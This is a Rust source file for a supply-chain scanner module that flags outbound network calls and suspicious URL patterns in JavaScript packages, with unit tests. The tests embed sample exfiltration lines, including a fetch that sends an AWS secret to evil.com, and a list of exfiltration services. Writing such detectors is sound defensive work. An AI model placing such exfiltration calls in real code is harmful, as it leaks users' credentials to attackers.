use swc_core::ecma::ast::*;
use swc_core::ecma::visit::{Visit, VisitWith};
use doria_types::{Finding, FindingKind, Severity, Location};

/// Function names that indicate network activity
const NETWORK_FUNCTIONS: &[&str] = &[
    "fetch",
    "axios",
    "get",
    "post",
    "put",
    "delete",
    "request",
    "connect",
];

/// Objects that own network methods
const NETWORK_OBJECTS: &[&str] = &[
    "http",
    "https",
    "axios",
    "net",
    "tls",
    "dns",
    "urllib",
];

/// Suspicious URL patterns — these appearing in a package install script is a red flag
const SUSPICIOUS_URL_PATTERNS: &[&str] = &[
    "ngrok",
    "burpcollaborator",
    "requestbin",
    "webhook",
    "pastebin",
    "raw.githubusercontent",
];

pub struct NetworkDetector {
    pub findings: Vec<Finding>,
    pub file: String,
    pub package_name: String,
    pub package_version: String,
}

impl NetworkDetector {
    pub fn new(file: String, package_name: String, package_version: String) -> Self {
        Self {
            findings: Vec::new(),
            file,
            package_name,
            package_version,
        }
    }

    fn add_finding(
        &mut self,
        line: u32,
        column: u32,
        description: String,
        evidence: Option<String>,
        confidence: f32,
    ) {
        self.findings.push(Finding {
            id: format!("doria-net-{:03}", self.findings.len() + 1),
            kind: FindingKind::NetworkCall,
            severity: Severity::High,
            package_name: self.package_name.clone(),
            package_version: self.package_version.clone(),
            description,
            location: Some(Location {
                file: self.file.clone(),
                line,
                column,
            }),
            evidence,
            confidence,
            slopsquatting: None,
        });
    }

    /// Check if a string literal looks like a suspicious URL
    fn check_url(&mut self, value: &str, line: u32) {
        for pattern in SUSPICIOUS_URL_PATTERNS {
            if value.contains(pattern) {
                self.add_finding(
                    line,
                    0,
                    format!("Suspicious URL pattern '{}' detected in string literal", pattern),
                    Some(value.to_string()),
                    0.90,
                );
            }
        }
    }
}

impl Visit for NetworkDetector {
    fn visit_call_expr(&mut self, call: &CallExpr) {
        if let Callee::Expr(expr) = &call.callee {
            match expr.as_ref() {
                // Detects: http.request(...), https.get(...), axios.post(...)
                Expr::Member(member) => {
                    if let Expr::Ident(obj) = member.obj.as_ref() {
                        if let MemberProp::Ident(prop) = &member.prop {
                            let obj_name = obj.sym.as_ref();
                            let method_name = prop.sym.as_ref();

                            if NETWORK_OBJECTS.contains(&obj_name)
                                && NETWORK_FUNCTIONS.contains(&method_name)
                            {
                                let line = call.span.lo.0;
                                self.add_finding(
                                    line,
                                    0,
                                    format!(
                                        "Outbound network call via {}.{}() detected",
                                        obj_name, method_name
                                    ),
                                    None,
                                    0.85,
                                );
                            }
                        }
                    }
                }
                // Detects: fetch('http://...')
                Expr::Ident(ident) => {
                    let name = ident.sym.as_ref();
                    if NETWORK_FUNCTIONS.contains(&name) {
                        let line = call.span.lo.0;

                        // Try to grab the URL from the first argument as evidence
                        let evidence = call.args.first().and_then(|arg| {
                            if let Expr::Lit(Lit::Str(s)) = arg.expr.as_ref() {
                                Some(s.value.to_string())
                            } else {
                                None
                            }
                        });

                        self.add_finding(
                            line,
                            0,
                            format!("Outbound network call via {}() detected", name),
                            evidence,
                            0.80,
                        );
                    }
                }
                _ => {}
            }
        }

        call.visit_children_with(self);
    }

    // Also scan string literals for suspicious URLs
    fn visit_lit(&mut self, lit: &Lit) {
        if let Lit::Str(s) = lit {
            self.check_url(s.value.as_ref(), s.span.lo.0);
        }
        lit.visit_children_with(self);
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use swc_core::ecma::parser::{lexer::Lexer, Parser, StringInput, Syntax};
    use swc_core::common::{SourceMap, FileName};
    // use swc_core::ecma::visit::VisitWith;
    // use std::sync::Arc;

    fn detect_in_js(code: &str) -> Vec<Finding> {
        let cm = std::rc::Rc::new(SourceMap::default());
        let fm = cm.new_source_file(FileName::Anon, code.to_string());
        let lexer = Lexer::new(
            Syntax::Es(Default::default()),
            Default::default(),
            StringInput::from(&*fm),
            None,
        );
        let mut parser = Parser::new_from(lexer);
        let module = parser.parse_module().expect("failed to parse");

        let mut detector = NetworkDetector::new(
            "test.js".to_string(),
            "test-pkg".to_string(),
            "1.0.0".to_string(),
        );
        detector.visit_module(&module);
        detector.findings
    }

    #[test]
    fn test_detects_https_get() {
        let code = r#"
            const https = require('https');
            https.get('http://evil.com/steal');
        "#;
        let findings = detect_in_js(code);
        assert!(!findings.is_empty());
        assert_eq!(findings[0].kind, FindingKind::NetworkCall);
    }

    #[test]
    fn test_detects_fetch() {
        let code = r#"
            fetch('http://evil.com/exfil?data=' + process.env.AWS_SECRET);
        "#;
        let findings = detect_in_js(code);
        assert!(!findings.is_empty());
    }

    #[test]
    fn test_detects_suspicious_url() {
        let code = r#"
            const url = 'https://abc123.burpcollaborator.net';
        "#;
        let findings = detect_in_js(code);
        assert!(!findings.is_empty());
    }

    #[test]
    fn test_clean_code_passes() {
        let code = r#"
            const x = 1 + 1;
            console.log(x);
        "#;
        let findings = detect_in_js(code);
        assert!(findings.is_empty());
    }
}